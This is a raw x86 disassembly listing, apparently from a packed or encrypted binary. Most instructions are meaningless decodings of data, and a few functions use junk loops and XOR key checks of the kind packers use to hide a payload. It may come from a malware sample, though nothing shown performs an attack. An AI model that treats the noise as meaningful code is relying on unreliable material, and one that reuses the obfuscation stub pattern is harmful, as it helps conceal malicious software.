  4028d6:	mov    edi,0x9e108ea2
  4028db:	push   ds
  4028dc:	xchg   esp,eax
  4028dd:	out    dx,eax
  4028de:	dec    ecx
  4028df:	mov    bh,0x69
  4028e1:	arpl   WORD PTR [edi],cx
  4028e3:	fdivr  st,st(6)
  4028e5:	push   esp
  4028e6:	adc    DWORD PTR [ebx+eax*2-0x5ba371e4],eax
  4028ed:	or     esp,esp
  4028ef:	mov    DWORD PTR [esi-0x4b],esi
  4028f2:	jp     0x4028e8
  4028f4:	add    esp,DWORD PTR [esi-0xf]
  4028f7:	mov    esp,0x4fc73e22
  4028fc:	mov    bl,0x54
  4028fe:	dec    edi
  4028ff:	cmp    BYTE PTR [eax+0x4c],ah
  402902:	sub    al,0xb8
  402904:	out    0xdc,eax
  402906:	pop    edx
  402907:	pop    esi
  402908:	test   BYTE PTR [eax+0x1a],al
  40290b:	sub    al,0x3b
  40290d:	pop    eax
  40290e:	mov    bl,0x54
  402910:	clc    
  402911:	out    dx,al
  402912:	xchg   ebx,eax
  402913:	lahf   
  402914:	iret   
  402915:	inc    edx
  402916:	pop    edx
  402917:	fstp   st(5)
  402919:	jge    0x402922
  40291b:	xchg   esp,eax
  40291c:	inc    esi
  40291d:	pop    esi
  40291e:	mov    ebp,0x17ea12c1
  402923:	rcl    BYTE PTR [eax-0x5a],1
  402926:	(bad)  
  402927:	dec    esp
  402928:	sub    al,0x9a
  40292a:	mov    DWORD PTR [ebp-0x78],edx
  40292d:	jl     0x4028bc
  40292f:	scas   eax,DWORD PTR es:[edi]
  402930:	hlt    
  402931:	dec    ebp
  402932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402933:	xchg   ecx,eax
  402934:	jg     0x402903
  402936:	aad    0x19
  402938:	fmul   DWORD PTR [esi+ecx*4-0x27d0ebfe]
  40293f:	std    
  402940:	jns    0x4028f4
  402942:	dec    edi
  402943:	ret    0xa423
  402946:	imul   esp,DWORD PTR [ebp-0x2bf57315],0x3d971a7b
  402950:	jle    0x40295b
  402952:	int    0x1a
  402954:	out    0x2c,al
  402956:	adc    eax,0x8e46d432
  40295b:	cwde   
  40295c:	mov    edx,0xf2f6ee40
  402961:	cmp    eax,DWORD PTR [esi-0x69]
  402964:	push   0xc95e5b83
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fd5d
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e76f
  402988:	sbb    DWORD PTR ds:0x42e793,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fd69,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fd69,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fd69,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e1ac
  4029bc:	push   0x42e783
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e4cf
  4029cc:	mov    edx,DWORD PTR ds:0x42fd69
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fd69,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e77f,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e77f,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e77f,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e353
  402a0d:	cmp    DWORD PTR ds:0x42e77f,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e77f
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e77f,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e77f
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e77f,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fe2e
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fd55,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd8d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e1a8,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e1a8,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e1a8
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e1a8,edi
  402a94:	cmp    DWORD PTR ds:0x42e1a8,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e1a8,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e1c1
  402ab3:	call   DWORD PTR ds:0x42e4d3
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x2f041e6a
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xb770707e
  402afd:	pop    ebx
  402afe:	cmp    ebx,DWORD PTR [edi-0x44]
  402b01:	push   eax
  402b02:	fwait
  402b03:	mov    ecx,0xa3bb23c9
  402b08:	loop   0x402aa1
  402b0a:	sbb    ax,WORD PTR [edx]
  402b0d:	mov    bl,0x77
  402b0f:	rcl    DWORD PTR [edi+0x625f0dd4],1
  402b15:	cmp    esp,0x80184e3f
  402b1b:	jg     0x402b78
  402b1d:	call   0xec7b:0x46df917
  402b24:	mov    dh,0xb2
  402b26:	or     DWORD PTR [ebx-0x3d1905c3],edx
  402b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b2d:	fnstcw WORD PTR [edx+eax*1+0x5f71314f]
  402b34:	(bad)  
  402b35:	out    0x9d,al
  402b37:	mov    ds:0x28aed352,eax
  402b3c:	ds mov bl,0x30
  402b3f:	lea    esi,[ebp-0x72]
  402b42:	jle    0x402b4c
  402b44:	xor    dl,BYTE PTR [ecx-0x5b293c46]
  402b4a:	push   ecx
  402b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b4c:	jg     0x402ad4
  402b4e:	cmc    
  402b4f:	jns    0x402b7c
  402b51:	adc    DWORD PTR [edx-0x14476c29],ebx
  402b57:	(bad)
  402b5a:	dec    ebp
  402b5b:	in     al,0xeb
  402b5d:	sbb    dl,BYTE PTR [edi+edi*8+0x140447f6]
  402b64:	daa    
  402b65:	or     al,0xf2
  402b67:	lods   eax,DWORD PTR ds:[esi]
  402b68:	(bad)  
  402b69:	push   cs
  402b6a:	out    dx,eax
  402b6b:	ins    DWORD PTR es:[edi],dx
  402b6c:	bound  eax,QWORD PTR [edi-0x35014e8f]
  402b72:	push   edx
  402b73:	cdq    
  402b74:	push   0x72ae2819
  402b79:	sbb    cl,ch
  402b7b:	cli    
  402b7c:	lods   eax,DWORD PTR ds:[esi]
  402b7d:	test   eax,0xf562fda3
  402b82:	call   0x8518bcf
  402b87:	std    
  402b88:	sub    DWORD PTR ss:[ebp+0x78],ebx
  402b8c:	dec    ebx
  402b8d:	or     ch,al
  402b8f:	pop    esi
  402b90:	jae    0x402ba8
  402b92:	jmp    0xa25c57f
  402b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b98:	das    
  402b99:	and    eax,0x6deb226c
  402b9e:	test   BYTE PTR [ebx+0x73],0xb2
  402ba2:	mov    eax,ds:0xb11f45c0
  402ba7:	jecxz  0x402bac
  402ba9:	mov    ch,0x50
  402bab:	loope  0x402c13
  402bad:	and    BYTE PTR [ecx+eiz*1-0x779ed03c],ah
  402bb4:	ficomp WORD PTR fs:[ebp-0x59]
  402bb8:	daa    
  402bb9:	scas   eax,DWORD PTR es:[edi]
  402bba:	push   ds
  402bbb:	jbe    0x402c16
  402bbd:	ret    
  402bbe:	jnp    0x402c0c
  402bc0:	mov    al,BYTE PTR [esi+0x14]
  402bc3:	clc    
  402bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc5:	jb     0x402c1e
  402bc7:	push   edx
  402bc8:	mov    ch,0x9d
  402bca:	xchg   edx,eax
  402bcb:	add    esi,ebx
  402bcd:	inc    edi
  402bce:	test   eax,0xb4d304c8
  402bd3:	and    cl,dl
  402bd5:	stos   BYTE PTR es:[edi],al
  402bd6:	mov    al,ds:0x63d3eba9
  402bdb:	arpl   WORD PTR [eax-0x13],si
  402bde:	rol    ecx,1
  402be0:	outs   dx,DWORD PTR ds:[esi]
  402be1:	mov    eax,ds:0xf05b0d3f
  402be6:	pop    esp
  402be7:	adc    dh,BYTE PTR [edx]
  402be9:	xchg   ebx,eax
  402bea:	pop    ss
  402beb:	add    DWORD PTR [edx],0xba5b8b19
  402bf1:	push   edi
  402bf2:	and    ah,cl
  402bf4:	fisttp DWORD PTR [ecx-0x7937e27e]
  402bfa:	mov    bl,0xfd
  402bfc:	or     esp,DWORD PTR [edi+0x1bcc7bec]
  402c02:	mov    ds:0x58e28626,al
  402c07:	push   0xe0dc62f0
  402c0c:	fisttp DWORD PTR [eax+eax*2-0x5e8d520]
  402c13:	pop    edx
  402c14:	adc    BYTE PTR [ebp+edx*2-0x7],dl
  402c18:	cdq    
  402c19:	dec    esp
  402c1a:	add    BYTE PTR [edx-0x4d],bl
  402c1d:	in     al,0xe
  402c1f:	cmp    DWORD PTR [ebx+eax*1-0x5e],edi
  402c23:	xchg   ebx,eax
  402c24:	lods   al,BYTE PTR es:[esi]
  402c26:	sbb    edx,edx
  402c28:	fimul  DWORD PTR [ebx+0x157fa3c0]
  402c2e:	ret    
  402c2f:	stos   DWORD PTR es:[edi],eax
  402c30:	mov    esi,0x9a42ef2b
  402c35:	cli    
  402c36:	sbb    BYTE PTR [esi+0x24efa269],bh
  402c3c:	xchg   BYTE PTR [esi+0x67501bad],dh
  402c42:	bound  esi,QWORD PTR [ecx]
  402c44:	xor    DWORD PTR [ecx+0x93d86cf],ebx
  402c4a:	icebp  
  402c4b:	call   0x2c0f6825
  402c50:	adc    ecx,esi
  402c52:	outs   dx,BYTE PTR ds:[esi]
  402c53:	mov    cl,BYTE PTR [esi+eiz*4+0x2a]
  402c57:	lods   al,BYTE PTR ds:[esi]
  402c58:	pop    esp
  402c59:	mov    edi,0x52d88103
  402c5e:	fwait
  402c5f:	add    eax,0x4e5e412e
  402c64:	loope  0x402cd4
  402c66:	mov    cl,0x99
  402c68:	cmc    
  402c69:	imul   BYTE PTR [edi+ebp*8]
  402c6c:	(bad)  
  402c6d:	ins    BYTE PTR es:[edi],dx
  402c6e:	or     al,0xfa
  402c70:	fst    QWORD PTR [edx]
  402c72:	hlt    
  402c73:	inc    esi
  402c74:	dec    eax
  402c75:	shr    BYTE PTR [edx-0x65561e7c],cl
  402c7b:	inc    edx
  402c7c:	jp     0x402ce6
  402c7e:	xlat   BYTE PTR ds:[ebx]
  402c7f:	cmp    DWORD PTR [eax-0x53],0x1b46b45a
  402c86:	jnp    0x402cd6
  402c88:	jle    0x402cc9
  402c8a:	lods   al,BYTE PTR ds:[esi]
  402c8b:	mov    fs,ecx
  402c8d:	leave  
  402c8e:	je     0x402ce4
  402c90:	dec    edi
  402c91:	cli    
  402c92:	xchg   esp,eax
  402c93:	jge    0x402c8d
  402c95:	mov    bl,0x50
  402c97:	add    bl,BYTE PTR [esi+0x2]
  402c9a:	test   DWORD PTR [ebp-0x966cb4f],ebp
  402ca0:	mov    WORD PTR [ebp+ecx*8+0x46],cs
  402ca4:	adc    al,0x27
  402ca6:	(bad)  
  402ca7:	retf   0xb1dd
  402caa:	mov    esp,0xe8152577
  402caf:	sub    BYTE PTR [ebx],0x3c
  402cb2:	(bad)
  402cb6:	(bad)  
  402cb8:	sbb    BYTE PTR [ebp+0x708f9425],bl
  402cbe:	pusha  
  402cbf:	pop    esi
  402cc0:	call   0x891:0x32c91f2d
  402cc7:	or     DWORD PTR [ecx-0x1f],eax
  402cca:	mov    ds:0xdf423b8a,eax
  402ccf:	adc    al,0x94
  402cd1:	sar    DWORD PTR [ebx],cl
  402cd3:	push   ebp
  402cd4:	xor    BYTE PTR [esi-0x60],al
  402cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd8:	jne    0x402d38
  402cda:	repnz mov WORD PTR [eax],?
  402cdd:	and    al,0x60
  402cdf:	mov    al,0xdb
  402ce1:	jecxz  0x402d3a
  402ce3:	jge    0x402d2c
  402ce5:	sub    BYTE PTR [eax-0x746989e0],ah
  402ceb:	sub    edx,DWORD PTR [ebx+0x44]
  402cee:	aaa    
  402cef:	sub    al,0xd6
  402cf1:	pop    esi
  402cf2:	cmp    BYTE PTR [ecx+0x44],cl
  402cf5:	or     ecx,DWORD PTR [edx+0x48]
  402cf8:	repnz push es
  402cfa:	xchg   edx,eax
  402cfb:	mov    ss,WORD PTR [edi+ecx*1]
  402cfe:	call   0xfade:0x7fd782ef
  402d05:	loopne 0x402ccd
  402d07:	int3   
  402d08:	lock pop edi
  402d0a:	dec    ebx
  402d0b:	jb     0x402d7a
  402d0d:	fwait
  402d0e:	hlt    
  402d0f:	ret    0xbc8
  402d12:	xchg   esp,eax
  402d13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d14:	pushf  
  402d15:	inc    edx
  402d16:	pusha  
  402d17:	lahf   
  402d18:	loope  0x402d51
  402d1a:	dec    esi
  402d1b:	scas   eax,DWORD PTR es:[edi]
  402d1c:	sbb    DWORD PTR ds:0xe0effda8,ebx
  402d22:	ja     0x402d03
  402d24:	pop    eax
  402d25:	sbb    DWORD PTR [ebx],edx
  402d27:	(bad)  
  402d28:	outs   dx,DWORD PTR ds:[esi]
  402d29:	pop    ss
  402d2a:	es repnz or al,0x69
  402d2e:	ds mov bh,0xd
  402d31:	dec    ebp
  402d32:	enter  0xfa46,0x77
  402d36:	xchg   edi,eax
  402d37:	inc    BYTE PTR [edx-0xf7bc999]
  402d3d:	mov    cl,0xd2
  402d3f:	push   ebp
  402d40:	pop    edi
  402d41:	fnstcw WORD PTR [edx+0x1c77e5c3]
  402d47:	in     al,0xc6
  402d49:	dec    esp
  402d4a:	inc    ebx
  402d4b:	mov    DWORD PTR [edi],0x1059e657
  402d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d52:	cli    
  402d53:	dec    edi
  402d54:	dec    cx
  402d56:	cmp    dh,BYTE PTR [edx]
  402d58:	mov    dh,0xc4
  402d5a:	fyl2x  
  402d5c:	test   al,0x62
  402d5e:	sti    
  402d5f:	ret    
  402d60:	push   cs
  402d61:	aam    0x9c
  402d63:	xor    BYTE PTR [edx-0x165bdb23],cl
  402d69:	int    0xa7
  402d6b:	gs xchg esi,eax
  402d6d:	jp     0x402dde
  402d6f:	outs   dx,DWORD PTR ds:[esi]
  402d70:	jecxz  0x402db4
  402d72:	imul   dh
  402d74:	cmp    eax,0xdbae913
  402d79:	and    ebp,eax
  402d7b:	sub    BYTE PTR [eax],cl
  402d7d:	fimul  WORD PTR ds:0x85f0d8d9
  402d83:	shl    DWORD PTR [edx-0x7a],cl
  402d86:	cmp    dh,BYTE PTR [eax+0x3e5cc1c7]
  402d8c:	cmp    DWORD PTR [esi+0x6bcd70cb],esi
  402d92:	jbe    0x402dc7
  402d94:	pushf  
  402d95:	aaa    
  402d96:	cmc    
  402d97:	cld    
  402d98:	retf   0xbca7
  402d9b:	xchg   edx,eax
  402d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d9d:	push   esi
  402d9e:	out    dx,al
  402d9f:	imul   edi,DWORD PTR [ecx],0xfffffffa
  402da2:	adc    cl,BYTE PTR [eax+0x5995e111]
  402da8:	loopne 0x402dd1
  402daa:	adc    DWORD PTR [ecx-0x7cc60be7],edx
  402db0:	(bad)  
  402db1:	clc    
  402db2:	fs mov ebp,0x31fec33e
  402db8:	ss cwde 
  402dba:	cld    
  402dbb:	cmp    al,0x4e
  402dbd:	mov    dl,0x3
  402dbf:	(bad)  
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	sahf   
  402de0:	and    DWORD PTR [ebx],ebp
  402de2:	dec    esi
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402d9b
  402dec:	inc    edi
  402ded:	inc    ebp
  402dee:	and    DWORD PTR [edi],ebp
  402df0:	out    0x88,al
  402df2:	cdq    
  402df3:	in     eax,0xb9
  402df5:	imul   ebp,DWORD PTR [eax],0x6f182a0a
  402dfb:	dec    edi
  402dfc:	not    BYTE PTR [ebp-0x23f4ef76]
  402e02:	bound  ebx,QWORD PTR [ebp-0x4e79fe49]
  402e08:	out    0xb5,al
  402e0a:	fild   DWORD PTR [edx+0x7c]
  402e0d:	repz mov ch,0x54
  402e10:	jle    0x402dc2
  402e12:	inc    esi
  402e13:	lods   al,BYTE PTR ds:[esi]
  402e14:	test   BYTE PTR [edx-0x6176808d],al
  402e1a:	mov    BYTE PTR [edi+eax*8+0x33],dl
  402e1e:	imul   ebx,DWORD PTR [ebx+0x76],0xffffffc1
  402e22:	dec    esi
  402e23:	arpl   WORD PTR [eax],sp
  402e25:	fbld   TBYTE PTR [edi]
  402e27:	sub    dl,BYTE PTR [edi-0x6b]
  402e2a:	mov    bh,0x20
  402e2c:	ins    BYTE PTR es:[edi],dx
  402e2d:	mov    ebp,DWORD PTR [edx-0x56]
  402e30:	outs   dx,DWORD PTR ds:[esi]
  402e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e32:	loop   0x402dea
  402e34:	mov    bl,0x44
  402e36:	pop    es
  402e37:	add    esi,DWORD PTR [ebx+0x55]
  402e3a:	scas   eax,DWORD PTR es:[edi]
  402e3b:	iret   
  402e3c:	fdiv   QWORD PTR [ebp+0x4e]
  402e3f:	push   edx
  402e40:	jp     0x402e27
  402e42:	xor    ah,dl
  402e44:	xor    eax,0x22edd114
  402e49:	pop    ss
  402e4a:	ins    BYTE PTR es:[edi],dx
  402e4b:	xlat   BYTE PTR ds:[ebx]
  402e4c:	cs int 0xb2
  402e4f:	cmp    BYTE PTR [edx-0x11baec49],ah
  402e55:	ins    BYTE PTR es:[edi],dx
  402e56:	sar    BYTE PTR [edx-0x4bed5f05],1
  402e5c:	sbb    BYTE PTR [eax+0x2116f62a],cl
  402e62:	mul    DWORD PTR [ebp-0x3b]
  402e65:	push   0xc1170a42
  402e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e6b:	(bad)  
  402e6c:	enter  0x9013,0xdd
  402e70:	inc    eax
  402e71:	jno    0x402e27
  402e73:	cmp    BYTE PTR [eax],bl
  402e75:	test   eax,0x536fe111
  402e7a:	test   ch,ah
  402e7c:	stc    
  402e7d:	and    ah,al
  402e7f:	xor    cl,BYTE PTR [eax]
  402e81:	test   eax,0x8ccbf700
  402e86:	push   ss
  402e87:	mov    ebx,0x7bcff22f
  402e8c:	or     BYTE PTR [ebx],0x74
  402e8f:	jl     0x402e38
  402e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e92:	bound  ecx,QWORD PTR [edx+edi*8-0x7f]
  402e96:	add    edi,ecx
  402e98:	repz rcl DWORD PTR [edx],1
  402e9b:	sub    BYTE PTR [edi+ebx*8],dh
  402e9e:	sub    DWORD PTR [ebp-0x6c],0x63acdf15
  402ea5:	jg     0x402eb0
  402ea7:	xchg   ebx,eax
  402ea8:	pop    ss
  402ea9:	fstp   st(7)
  402eab:	mov    ah,0x80
  402ead:	or     eax,0xa4d57012
  402eb2:	xor    edi,eax
  402eb4:	jg     0x402e86
  402eb6:	pop    ss
  402eb7:	rcr    DWORD PTR [ecx-0x4c],0xb6
  402ebb:	pop    ds
  402ebc:	addr16 inc eax
  402ebe:	xchg   DWORD PTR [ecx+0xaefc26f],ebp
  402ec4:	(bad)  
  402ec5:	out    dx,al
  402ec6:	ss and eax,0xf476df46
  402ecc:	gs int 0xf6
  402ecf:	or     edi,DWORD PTR [ecx-0x7a05c0a]
  402ed5:	loopne 0x402f1b
  402ed7:	or     BYTE PTR es:[ecx+edi*1],dl
  402edb:	hlt    
  402edc:	mov    ecx,0xf52c3eb9
  402ee1:	frstor [eax+0x49d099b0]
  402ee7:	cmp    al,0x7b
  402ee9:	mov    ebp,0xd07aaa44
  402eee:	sub    al,0xee
  402ef0:	icebp  
  402ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ef2:	ja     0x402ed3
  402ef4:	repnz cld 
  402ef6:	cdq    
  402ef7:	or     edx,edx
  402ef9:	fwait
  402efa:	cdq    
  402efb:	jl     0x402e97
  402efd:	loope  0x402e98
  402eff:	xor    BYTE PTR [edi-0x6a4ed5f7],bl
  402f05:	add    DWORD PTR [ebx+0x51],0x6b7a58a6
  402f0c:	pop    ds
  402f0d:	cwde   
  402f0e:	leave  
  402f0f:	clc    
  402f10:	adc    BYTE PTR [ecx+0x1b6718ae],0x3e
  402f17:	mov    ebx,0x78f4e1b5
  402f1c:	mov    edi,0xb033cccd
  402f21:	loopne 0x402ee4
  402f23:	or     eax,0x1a4664b5
  402f28:	inc    ebx
  402f29:	push   eax
  402f2a:	dec    ecx
  402f2b:	mov    bh,0x42
  402f2d:	pop    es
  402f2e:	mov    dl,0x91
  402f30:	sahf   
  402f31:	adc    eax,0xfc8ead0d
  402f36:	pop    esi
  402f37:	xor    bl,BYTE PTR [ecx+edi*1+0x11]
  402f3b:	and    dl,BYTE PTR [edi+0x184dab3a]
  402f41:	leave  
  402f42:	inc    ebp
  402f43:	(bad)  
  402f44:	push   ebp
  402f45:	out    0xa4,eax
  402f47:	mov    ebx,0x532869eb
  402f4c:	shl    al,0xad
  402f4f:	(bad)  
  402f50:	(bad)  
  402f51:	mov    ch,cl
  402f53:	addr16 push edx
  402f55:	xchg   BYTE PTR [esi-0x4d],dh
  402f58:	out    dx,eax
  402f59:	shld   DWORD PTR [ecx-0x29],ebp,0x69
  402f5e:	fwait
  402f5f:	les    esi,FWORD PTR [esi+0x11]
  402f62:	mov    WORD PTR [ebx-0x63],gs
  402f65:	cmp    esi,eax
  402f67:	out    dx,eax
  402f68:	mov    cl,bl
  402f6a:	inc    eax
  402f6b:	mov    WORD PTR [esi+0x35],ds
  402f6e:	in     al,dx
  402f6f:	jmp    0x94d0ffd3
  402f74:	lahf   
  402f75:	in     eax,dx
  402f76:	add    BYTE PTR [edx],ch
  402f78:	jmp    0x402fda
  402f7a:	out    dx,al
  402f7b:	xlat   BYTE PTR ds:[ebx]
  402f7c:	cmp    al,0x48
  402f7e:	lea    edx,[edx+ecx*4-0x251677b1]
  402f85:	test   dl,0x5d
  402f88:	(bad)  
  402f89:	push   ds
  402f8a:	xor    cl,BYTE PTR [ebp-0x25]
  402f8d:	in     eax,dx
  402f8e:	daa    
  402f8f:	jnp    0x402f4c
  402f91:	into   
  402f92:	out    dx,al
  402f93:	jne    0x402f21
  402f95:	mov    bl,0x7a
  402f97:	scas   eax,DWORD PTR es:[edi]
  402f98:	jae    0x402f67
  402f9a:	stos   BYTE PTR es:[edi],al
  402f9b:	mov    ds:0x4ec697b4,al
  402fa0:	adc    al,0xd1
  402fa2:	fcomi  st,st(4)
  402fa4:	mov    esp,0x333de9f7
  402fa9:	out    dx,al
  402faa:	in     eax,0x5
  402fac:	scas   eax,DWORD PTR es:[edi]
  402fad:	cli    
  402fae:	or     BYTE PTR [esi],0xa7
  402fb1:	aam    0xa2
  402fb3:	sub    BYTE PTR [ecx+0x46],bh
  402fb6:	call   0x2c7d06e2
  402fbb:	xchg   ebx,eax
  402fbc:	lea    ebx,[edx]
  402fbe:	cmp    DWORD PTR [edx],ebx
  402fc0:	mov    bl,0x15
  402fc2:	gs mov ch,0x9f
  402fc5:	xchg   BYTE PTR [ebx+0x25f507b7],ch
  402fcb:	cmc    
  402fcc:	pushf  
  402fcd:	loope  0x40300b
  402fcf:	xor    DWORD PTR [esi-0x66d98bc1],ebp
  402fd5:	mov    ecx,0x7853c139
  402fda:	shl    DWORD PTR ds:0xabe5317b,1
  402fe0:	and    al,0x80
  402fe2:	inc    edx
  402fe3:	jns    0x40304a
  402fe5:	cmp    ecx,DWORD PTR [ebp+0x5d]
  402fe8:	push   cs
  402fe9:	cmp    eax,0x3329e224
  402fee:	pop    ebp
  402fef:	popa   
  402ff0:	mul    al
  402ff2:	cdq    
  402ff3:	dec    eax
  402ff4:	xor    BYTE PTR [edx-0x426082fa],dh
  402ffa:	sbb    eax,0x8a0e9951
  402fff:	pop    esp
  403000:	xchg   BYTE PTR [ebp-0x35],dh
  403003:	mov    ah,BYTE PTR [ebx-0x49]
  403006:	(bad)  
  403008:	jns    0x40300f
  40300a:	push   eax
  40300b:	inc    ebx
  40300c:	dec    esi
  40300d:	fld    DWORD PTR [ebp+eax*1-0x106925b3]
  403014:	mov    ebp,0xa6cc5e17
  403019:	leave  
  40301a:	xor    al,0x9b
  40301c:	call   0xa6a68e
  403021:	mov    esi,0x4d2cffd5
  403026:	push   cs
  403027:	mov    al,ds:0xc146bf22
  40302c:	and    al,0x49
  40302e:	jp     0x402fcc
  403030:	loope  0x40303d
  403032:	lea    ecx,[ecx-0x55ae284]
  403038:	(bad)  
  403039:	sub    ebp,edi
  40303b:	test   bh,cl
  40303d:	or     esi,esp
  40303f:	mov    ds:0xfdefaa9c,al
  403044:	pushf  
  403045:	mov    ebp,0x5afc126f
  40304a:	(bad)  
  40304b:	ins    DWORD PTR es:[edi],dx
  40304c:	dec    esp
  40304d:	mov    al,0x4e
  40304f:	test   BYTE PTR [edx],ah
  403051:	loop   0x403031
  403053:	mov    ds:0xe273a195,eax
  403058:	mov    esi,0xd30a1327
  40305d:	pop    ebx
  40305e:	cmp    cl,BYTE PTR [ecx+0x2f962e31]
  403064:	xor    eax,0xde94d1a2
  403069:	pop    es
  40306a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40306b:	popf   
  40306c:	iret   
  40306d:	xchg   DWORD PTR ds:0xa5928926,eax
  403073:	outs   dx,BYTE PTR ds:[esi]
  403074:	cmp    bh,dh
  403076:	aam    0xae
  403078:	test   BYTE PTR [esi-0x40],bl
  40307b:	stos   BYTE PTR es:[edi],al
  40307c:	scas   eax,DWORD PTR es:[edi]
  40307d:	adc    DWORD PTR [esi+0x2441e55],edi
  403083:	ret    
  403084:	push   0x43
  403086:	pop    esp
  403087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403088:	cli    
  403089:	ja     0x40303e
  40308b:	fstp   DWORD PTR [ebx+0x4b673d29]
  403091:	xchg   edx,eax
  403092:	mov    ebp,0x84517e8b
  403097:	xchg   ebx,eax
  403098:	pop    eax
  403099:	jle    0x40308c
  40309b:	pop    edi
  40309c:	retf   
  40309d:	cdq    
  40309e:	jnp    0x4030d6
  4030a0:	data16 fs sub bl,bl
  4030a4:	rol    DWORD PTR [edx+0x1e],0x69
  4030a8:	rol    DWORD PTR [ebx-0x5e],cl
  4030ab:	push   0x729cbe4b
  4030b0:	xor    al,BYTE PTR [eax]
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xbe
  4030ce:	scas   eax,DWORD PTR es:[edi]
  4030cf:	jl     0x40314d
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x8470707e
  4030da:	(bad)  
  4030db:	sbb    eax,0xe6177b94
  4030e0:	dec    edx
  4030e1:	jb     0x40308b
  4030e3:	mov    bh,0x46
  4030e5:	xor    DWORD PTR [edx],ecx
  4030e7:	lds    edi,FWORD PTR fs:[esi+0x79]
  4030eb:	les    edi,FWORD PTR [eax-0x25]
  4030ee:	mov    esp,0x3ae016fc
  4030f3:	call   0xdd12:0x3e3a5a96
  4030fa:	dec    ebp
  4030fb:	pop    eax
  4030fc:	pop    esi
  4030fd:	sub    BYTE PTR [esi+eax*4],ch
  403100:	pop    ebx
  403101:	(bad)  
  403102:	mov    ch,0xdf
  403104:	nop
  403105:	sti    
  403106:	sub    DWORD PTR [esi-0x665af818],esi
